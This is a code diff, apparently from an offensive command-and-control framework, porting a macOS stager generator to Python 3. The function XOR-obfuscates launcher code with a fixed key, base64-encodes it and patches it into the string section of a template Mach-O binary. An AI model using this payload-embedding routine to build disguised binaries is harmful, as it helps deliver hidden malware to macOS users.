@@ -193,10 +193,10 @@ class Stagers(object):
             count = 0
             if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                 count += 1
-                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
                     count += 1
                     for section in cmd[count]:
-                        if section.sectname.strip('\x00') == '__cstring':
+                        if section.sectname.strip(b'\x00') == b'__cstring':
                             offset = int(section.offset) + (int(section.size) - 2119)
                             placeHolderSz = int(section.size) - (int(section.size) - 2119)
 
@@ -205,10 +205,14 @@ class Stagers(object):
 
         if placeHolderSz and offset:
 
-            key = 'subF'
-            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(launcherCode, cycle(key)))
-            launcherCode = base64.urlsafe_b64encode(launcherCode)
-            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            key = b'subF'
+            if isinstance(launcherCode, str):
+                launcherCode = launcherCode.encode('UTF-8')
+            launcherCode = ''.join(chr(x ^ y) for (x,y) in zip(launcherCode, cycle(key)))
+            launcherCode = base64.urlsafe_b64encode(launcherCode.encode('UTF-8'))
+
+
+            launcher = launcherCode + b"\x00" * (placeHolderSz - len(launcherCode))
             patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
 
             return patchedMachO
